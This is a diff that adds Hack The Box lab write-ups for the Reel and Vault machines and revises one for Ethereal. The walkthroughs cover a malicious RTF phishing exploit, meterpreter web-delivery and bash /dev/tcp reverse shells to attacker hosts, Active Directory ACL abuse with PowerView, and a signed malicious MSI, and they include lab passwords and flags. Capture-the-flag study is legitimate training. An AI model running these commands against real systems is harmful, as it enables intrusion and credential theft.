@@ -1,3 +1,452 @@
+******************************************************************
+ 
+HTB REEL
+Discovery
+nmap -sV -sC -Pn -p 1-65535 -T5 10.10.10.77
+21/tcp open ftp Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_05-29-18 12:19AM <DIR> documents
+| ftp-syst:
+|_ SYST: Windows_NT
+22/tcp open ssh OpenSSH 7.6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
+| 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
+|_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
+25/tcp open smtp?
+| fingerprint-strings:
+| DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, | 220 Mail Service ready
+| FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
+| 220 Mail Service ready
+| sequence of commands
+| sequence of commands
+| Hello:
+| 220 Mail Service ready
+| EHLO Invalid domain address.
+| Help:
+| 220 Mail Service ready
+| DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| SIPOptions:
+| 220 Mail Service ready
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+| sequence of commands
+|_ sequence of commands
+| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
+1
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+ 
+First we downloaded all the files from the FTP:
+• AppLocker.docx
+• readme.txt
+• Window Event Forwarding
+ 
+The readme states:
+please email me any rtf format procedures - I'll review and convert.
+new format / converted documents will be saved here.
+ 
+So we need to send a malicious rtf document to the machine using the SMTP service on port 25.
+ 
+We first need an email address to send these emails, from the FTP’s files we discovered some email addresses.
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="We found an email address: nico@megabank.com but also LAPTO12.HTB.LOCAL and WEF.HTB.LOCAL in the docx file.
+ 
+From metasploit we found an exploit called exploit/windows/fileformat/office_word_hta created for the CVE-2017-0199
+to craft a malicious RTF file with a meterpreter payload.
+ 
+And with alpine we sent an email to reel@htb.local (or any other address in htb.local domain).
+N.B. on alpine we need to set as our domain: htb.local and as SMTP server the IP 10.10.10.77.
+ 
+But first we have to convert this file we are storing in our local server as RTF FILE for that i found this python script
+ 
+https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py
+Now running this command should give us as output the Invoice2.rtf file that we need to send as attachment in alpine email client.
+python toolkit.py -w Invoice2.rtf -t RTF -M gen -u
+ 
+Once we have sent the email and having our msfconsole module running and listeneing on payload port we should receive a meterpreter session as htb\nico.
+port 3487  
+Now we can read our user flag:
+fa363aebcfa2c29897a69af385fee971
+ 
+PRIVILEGE SCALATION
+ 
+Now for enumeration we have a
+WINDOWS 2012 R2 SERVER
+RUNNING ON X64 BITS
+ 
+In the same folder we found another file called cred.xml which contains a PSCredential object
+##########################################
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+<Obj RefId="0">
+<TN RefId="0">
+<T>System.Management.Automation.PSCredential</T>
+<T>System.Object</T>
+</TN>
+<ToString>System.Management.Automation.PSCredential</ToString>
+<Props>
+<S N="UserName">HTB\Tom</S>
+<SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d79</Props>
+3
+</Obj>
+</Objs>
+##########################################
+Those are the creds for user HTB\Tom encrypted.
+ 
+This object could be manipulated only on the same computer of the owner of the file (HTB\nico). From a powershell
+shell from meterpreter we can get the password for HTB\Tom with this command:
+ $credential = Import-CliXml -Path
+'C:\Users\nico\Desktop\cred.xml';$credential.GetNetworkCredential().Password.
+ 
+First we load the file a Credential as SecureString and then we can access those encrypted information.
+The password for the user tom is: 1ts-mag1c!!!.
+Now we can SSH into the machine with this combination.
+ 
+Tom groups informations (net user tom)
+ 
+Local Group Memberships *Print Operators
+Global Group memberships *Domain Users *SharePoint_Admins
+*MegaBank_Users *DR_Site
+*HelpDesk_Admins *Restrictions
+ 
+Using reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" we found the password for the user
+nico: 4dri@na2017!**. Yes, this is useless for our privesc proces :)
+ 
+In C:\Users\tom\Desktop\AD Audit we have BloodHound folder e note.txt:
+Findings:
+Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).
+Maybe we should re-run Cypher query against other groups we've created.
+BloodHound is a tool to reveal hidden and unintended relationships within an Active Directory environment; the tool require a
+recon phase to read all informations from the AD: this data collection is possible with PowerView (from PowerSploit).
+Luckly in the BloodHound folder there is the BloodHound_Old.ps1 script and to use it we simply Import-Module
+./BloodHound_Old.ps1 and with Invoke-BloodHound we can create the CSV files with all informations.
+To download our files we create a meterpreter session: msfconsole -x "use exploit/multi/script/web_delivery;
+set target PSH; set payload windows/x64/meterpreter/reverse_tcp; set srvhost 10.10.14.169; set LHOST
+10.10.14.169; set LPORT 3487; run".
+Now have all the data for BloodHound (you need to install it on you machine with neo4j).
+From the BloodHound application we can query the DB create with out CSVs to find the shortest path to Domain Admins.
+ 
+From the note, unfortunately, we know that we can’t exploit a shortest path to Domain Admins so we need to run Cypher to
+query the shortest path for others groups.
+With /usr/share/neo4j/bin/cypher-shel we have a command line query interface for the boltDB create within BloodHound
+(or from the Raw Query in BloodHound GUI).
+5
+With Get-ADGroup -filter * -properties GroupCategory | ft name,SamAccountName we got all groups in AD:
+name SamAccountName
+---- --------------
+WinRMRemoteWMIUsers__ WinRMRemoteWMIUsers__
+Administrators Administrators
+Users Users
+Guests Guests
+Print Operators Print Operators
+Backup Operators Backup Operators
+Replicator Replicator
+6
+Remote Desktop Users Remote Desktop Users
+Network Configuration Operators Network Configuration Operators
+Performance Monitor Users Performance Monitor Users
+Performance Log Users Performance Log Users
+Distributed COM Users Distributed COM Users
+IIS_IUSRS IIS_IUSRS
+Cryptographic Operators Cryptographic Operators
+Event Log Readers Event Log Readers
+Certificate Service DCOM Access Certificate Service DCOM Access
+RDS Remote Access Servers RDS Remote Access Servers
+RDS Endpoint Servers RDS Endpoint Servers
+RDS Management Servers RDS Management Servers
+Hyper-V Administrators Hyper-V Administrators
+Access Control Assistance Operators Access Control Assistance Operators
+Remote Management Users Remote Management Users
+Domain Computers Domain Computers
+Domain Controllers Domain Controllers
+Schema Admins Schema Admins
+Enterprise Admins Enterprise Admins
+Cert Publishers Cert Publishers
+Domain Admins Domain Admins
+Domain Users Domain Users
+Domain Guests Domain Guests
+Group Policy Creator Owners Group Policy Creator Owners
+RAS and IAS Servers RAS and IAS Servers
+Server Operators Server Operators
+Account Operators Account Operators
+Pre-Windows 2000 Compatible Access Pre-Windows 2000 Compatible Access
+Incoming Forest Trust Builders Incoming Forest Trust Builders
+Windows Authorization Access Group Windows Authorization Access Group
+Terminal Server License Servers Terminal Server License Servers
+Allowed RODC Password Replication Group Allowed RODC Password Replication Group
+Denied RODC Password Replication Group Denied RODC Password Replication Group
+Read-only Domain Controllers Read-only Domain Controllers
+Enterprise Read-only Domain Controllers Enterprise Read-only Domain Controllers
+Cloneable Domain Controllers Cloneable Domain Controllers
+Protected Users Protected Users
+DnsAdmins DnsAdmins
+DnsUpdateProxy DnsUpdateProxy
+Exchange Install Domain Servers $831000-BCI3MP5FNBO5
+Backup_Admins Backup_Admins
+AppLocker_Test AppLocker_Test
+SharePoint_Admins SharePoint_Admins
+DR_Site DR_Site
+SQL_Admins SQL_Admins
+HelpDesk_Admins HelpDesk_Admins
+Restrictions Restrictions
+All_Staff All_Staff
+MegaBank_Users MegaBank_Users
+Finance_Users Finance_Users
+HR_Team HR_Team
+The syntax for Cypher is not easy but is well documented and full of examples: https://blog.cptjesus.com/posts/introtocypher.
+The query for searching the group nodes that can be returned to only the “DOMAIN ADMINS@HTB.LOCAL” from
+the n nodes finding the shortest path is: MATCH (n:User), (m:Group {name: "DOMAIN ADMINS@INTERNAL.LOCAL"}),
+p=shortestPath((n)-[*1..]->(m)) RETURN p.
+First we need to search all groups that have admin right: MATCH (n:Group) WHERE n.name =~ "(?i).*ADMINS.*" WITH n
+MATCH (n)<-[r:MemberOf*1..]-(m) RETURN n,r,m; with this query we got all admins group and their relationships
+7
+8
+Using this command Import-Module ActiveDirectory;cd ad:;(Get-Acl(Get-ADGroup -Filter 'name -eq "backup_admins"').DistinguishedName).| ft identityreference, accessControlType -AutoSize we can read which rights a group has over the system.
+Since tom is member of SharePoint_Admins and HelpDesk_Admins we can skip this two groups; backup_admins is our target
+group since a backup routine/user should access all data (including our root.txt inside the Administrator folder). From tom
+we can’t add any user to backup_admins so we need to exploit another user.
+We found out that we can use claire to access backup_admins group.
+In order to privesc to claire we check the rights from tom to claire within BloodHound (bruteforcing user all the users).
+9
+We found that tom can set the WriteOwner right over claire: we can reset the user password from tom.
+cd "C:\Users\tom\Desktop\AD Audit\BloodHound"
+$upwd = ConvertTo-SecureString "1ts-mag1c!!!" -AsPlainText -Force;
+Import-Module ./PowerView.ps1
+Set-DomainObjectOwner -identity claire -owneridentity tom
+Add-ObjectACL -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+Set-ADAccountPassword claire -NewPassword $upwd –Reset
+This script will use PowerView to change the default password of claire to the same of tom.
+Now we can SSH as claire.
+But we cannot add claire to backup_admins with Add-ADGroupMember -Identity "backup_admins" -Members claire so
+from tom session we used
+cd "C:\Users\tom\Desktop\AD Audit\BloodHound"
+$upwd = ConvertTo-SecureString "1ts-mag1c!!!" -AsPlainText -Force;
+Import-Module ./PowerView.ps1
+$cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\Claire', $upwd)
+Add-DomainGroupMember -Identity "backup_admins" -Members 'Claire' -Credential $cred
+to add claire to our backup_admins group. Now we can SSH as claire with read permission on the Administrator folder:
+PS C:\> net user claire
+User name claire
+Full Name Claire Danes
+Comment
+User's comment
+Country/region code 000 (System Default)
+Account active Yes
+Account expires Never
+Password last set 7/24/2018 7:59:49 PM
+Password expires Never
+Password changeable 7/25/2018 7:59:49 PM
+Password required Yes
+User may change password Yes
+Workstations allowed All
+Logon script
+User profile
+Home directory
+10
+Last logon 7/24/2018 6:42:19 PM
+Logon hours allowed All
+Local Group Memberships *Hyper-V Administrator
+Global Group memberships *Backup_Admins *Domain Users
+*MegaBank_Users *DR_Site
+*Restrictions
+But we cannot access the root.txt file:
+On the admin desktop folder we found some script used to backup file over the system into a shared folder \\BACKUP03.
+We cannot access that folder but we found at the head of the BackupScript.ps1:
+# admin password
+$password="Cr4ckMeIfYouC4n!"
+Using that password to SSH with administrator we can read the root flag.
+1018a0331e686176ff4577c728eaf32a
+ 
+ 
+*******************************************************
+ 
+HTB VAULT
+1)We begin our nmap scan showing us the following
+ 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
+|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
+|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
+80/tcp open  http    Apache/2.4.18 (Ubuntu)
+| http-methods:
+|_  Supported Methods: OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=11/3%OT=22%CT=1%CU=30830%PV=Y%DS=2%DC=T%G=Y%TM=5BDDF38
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+ 
+Uptime guess: 31.849 days (since Tue Oct  2 17:51:24 2018)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   182.13 ms 10.10.12.1
+2   181.42 ms 10.10.10.109
+ 
+Then performing a upd scan we foun
+ 
+631 udp open|filtered ipp
+989 udp open|filtered ftps-data
+3659 udp open|filtered apple-sasl
+5353 udp open|filtered zeroconf
+ 
+   
+2)Then we go to web page and shows us:
+ 
+We are proud to announce our first client: Sparklays (Sparklays.com still under construction)
+ 
+So maybe if we edit the /etc/hosts file to point to this ip we can get something
+and not its nothing
+3)Running dirb with common.txt we found
+/index.php
+/server-status 403f
+ 
+So we have nothing looking at the site again we know we missed something and its the new site
+so testing we add /sparklays dir now running dirb with -x .php extension we managed to get to sites 200ok
+ 
+/admin.php  ----> this one shows a login page trying to access with default users or pass we cant see any error messages
+/login.php  ----> this one shows acces denied
+ 
+now running dirbuster with small dirlist manage to found
+ 
+sparklays/design dir
+which contains
+/design/uploads
+/design/design.html
+/design/changelogo.php which is a upload app
+ 
+trying to upload a reverse shell i managed to do it changing its extension to php.png but now im not able to locate the file i tried in /design/uploads but it isnt workin.
+ 
+Trought a lot of attemps i manage to get a working shell just by renaming its extension to php5
+ 
+Now we are in doing a little enumeration i found the home dir for Dave and in desktop a file called ssh where are stored the ssh credentials as follows:
+ 
+dave:Dav3therav3123
+ 
+now logged in with ssh in daves directory theres a .root.txt.swp
+which contains :
+b0nano 2.5.daveubunturoot.txtb0nano it seems like a troll
+ 
+Basic enumeration give us nothing but checking command ip a
+show us theres a subnet linked:
+ 
+ip: 192.168.122.1
+It seems like the princess its in a different castle
+ 
+now we have to find a way to upload a nmap socat and netcat
+this can be achieve with a meterpreter session and for that we will use the elf method
+nmap didnt compile also static binary didnt work so i did a perl scan:
+ 
+Showed us this
+ 
+ip 192.168.122.4 its listening port 80 and 22 so we can add a portfwd rule on meterpreter or
+create a tunnel with ssh but first add this line to proxychains in /etc/proxychains.conf:
+127.0.0.1 1080
+ 
+ssh -L 1080:192.168.122.4:80 dave@10.10.10.109
+ 
+now browsing to this page on localhost:6802 shows us 2 link 1 for dns and 1 for vpn config
+on vpn config we have a way to put a ovpn config file and test for connections.
+ 
+Running gobuster on that page i managed to found a dir called /notes which contains:
+ 
+chmod 123.ovpn and script.sh to 777
+ 
+so i tried to go to the file 123.ovpn and got this:
+ 
+remote 192.168.0.1 9004
+dev tun
+nobind
+script-security 2
+up '/bin/bash -c "/bin/bash -i > /dev/tcp/192.168.122.1/9998 0<&1
+2>&1&"'
+ 
+UPDATE THE SCRIPT AND THEN TEST VPN CONNECTION
+ 
+Tried this on vpnconfig.php page copy paste it and started a nc listener on port 9998:
+ 
+got a shell with root privileges going to /home/dave we manage to find the user flag:
+a4947faa8d4e1f80771d34234bd88c73
+ 
+Now reading in /etc/hosts
+i found a new ip address
+192.168.5.2
+Searching on /var/logs/auth.logs i found this
+ 
+if we go to /home/dave we can find a new credential for dave for this ssh server
+dave
+dav3gerous567
+ 
+so we can now ssh to 192.168.122.4 making a ssh tunnel like before to port 22
+ 
+now login and make sudo /bin/bash to have root privs
+now searching for logs we found /var/log/auth.log
+which running command cat auth.log | grep -a 192.168.5.2 shows us that this its running on port 4444 but its like hide.
+ 
+so we have to use ncat to open a port with this command
+ncat -l 5555 --sh-exec "ncat 192.168.5.2 987 --source-port=4444" &
+ 
+now we can check port its open with :
+ 
+/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+ 
+now to connect to his ip we have to do the following since we are opening a port 5555 on localhost to 192.168.5.2 987 with source port 4444:
+ 
+we do ssh dave@localhost -p 5555
+we should get our connection
+ 
+Once we are on Vault we have to scape the rbash with cp command
+so cp /bin/sh /home/dave
+now sh
+we have escaped now we have to decrypt the root.txt.gpg flag
+ 
+but for this we have to this on first machine so we use scp to transfer this to ubuntu machine like this:
+ 
+first on DNS we run this:
+ 
+scp -P 5555 dave@localhost:/home/dave/root.txt.gpg /tmp
+ 
+now on ubuntu machine we transfer like this:
+ 
+scp dave@192.168.122.4:/tmp/root.txt.gpg /dev/shm/
+ 
+now we have the gpg file on ubuntu machine.
+ 
+if we go to the dir containing the file and do :
+ 
+gpg -d root.txt.gpg
+ 
+it will ask us for a passphrase so i pass it since the beggining but searching for it on ubuntu machine i managed to found it in file called key placed on /home/dave/Desktop/key containing the key for gpg file:
+itscominghome
+ 
+Now we can decrypt our root.txt.gpg flag:
+ 
+ca468370b91d1f5906e31093d9bfe819
+ 
+ 
+ 
+*******************************************************
+ 
 HTB ETHEREAL
 1)First its first so we do an nmap scan showing us the following result:
 80 tcp
@@ -140,17 +589,22 @@ Once we have the connection we can now read the user flag.
 type c:\users\jorge\desktop\user.txt
 2b9a4ca09408b4a39d87cbcd7bd524dd
  
-Now onto PRIVILEGE SCALATION
-
-Enumeration took us to D:\ volume there was a file located in D:\DEV\MSI\note.txt that was from user etherea\rupal
+PRIVILEGE SCALATION
+Now that I was able to run commands as jorge, I was still unable to execute anything.
+I was, however, able to view the contents of the D:\ volume
+ 
+In the D:\ volume, there was a file D:\DEV\MSIs\note.txt that was from the user
+ethereal\rupal which said:
+ 
 Please drop MSIs that need testing into this folder - I will review regularly.
 Certs have been added to the store already.
 - Rupal
-
-Now we know we need to generate an evil.msi file to put in that folder for rupal "test"
-
-so we can generate one msi file like this:
-########################################################################################
+ 
+The note made it pretty obvious as to what the next step was.
+I needed to generate a malicious .msi file to put in that folder for rupal to “test”.
+ 
+My malicious msi file was as follows:
+##############################################################################
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
 <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
@@ -184,49 +638,48 @@ invalid vbs to fail install
 </InstallExecuteSequence>
 </Product>
 </Wix>
-##############################################################################
+##################################################################################
 I used the wix tool set (which can be found at http://wixtoolset.org/releases/ ) on
 my windows vm to compile the msi xml file shown above.
-
+ 
 I used candle.exe on the msi xml file above which created payload.wixobj
-
+ 
 then light.exe payload.wixobj which creates the compiled payload.msi
-
+ 
 I had to download the certs rupal mentioned in his note so I could sign my malicious .msi
 file. The certs were in the D:\certs folder, MyCA.cer and MyCA.pvk
-
+ 
 I was able to use the certs to sign my malicious msi file using:
 pvk2pfx -pvk C:\temp\MyCa.pvk -spc C:\temp\MyCa.cer -pfx C:\temp\MyCa.pfx
 which created the MyCA.pfx file that includes the cer and pvk
-
+ 
 makecert -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic
 C:\temp\MyCA.cer -iv c:\temp\MyCA.pvk -sv C:\temp\MySPC.pvk c:\temp\MySPC.cer
 which creates a new MySPC.cer and MySPC.pvk for signing
-
-pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\M
-ySPC.pfx
+ 
+pvk2pfx -pvk C:\temp\MySPC.pvk -spc C:\temp\MySPC.cer -pfx C:\temp\MySPC.pfx
 which uses the new cer and pvk files to create my own pfx
-
+ 
 signtool sign /v /n "Me" /s SPC C:\file.msi
 and finally sign the msi payload file
-
+ 
 I uploaded my payload msi to C:\windows\tracing\ so that I could copy it to the
 D:\DEV\MSIs folder as needed.
-
+ 
 When an msi file is uploaded to the D:\DEV\MSIs folder, every few minutes rupal “tests”
-the file and then deletes all msi files in D:\DEV\MSIs.
-
+the file and then deletes all msi files in D:\DEV\MSIs .
+ 
 As soon as I copy the msi file with the openssl command, I have to VERY QUICKLY :
+ 
 ● exit out of the openssl connection I have as jorge
 ● enter the openssl command to wait for a connection again on port 73
 ● and then type or paste in a command to be run as rupal.
-
 If done correctly, you will see the command run as rupal.
+ 
 The command I used was a simple:
 type C:\Users\rupal\Desktop\root.txt
-
-root flag: 1cb6f1fc220e3f2fcc0e3cd8e2d9906f
  
+1cb6f1fc220e3f2fcc0e3cd8e2d9906f
  
 *************************************************************
  
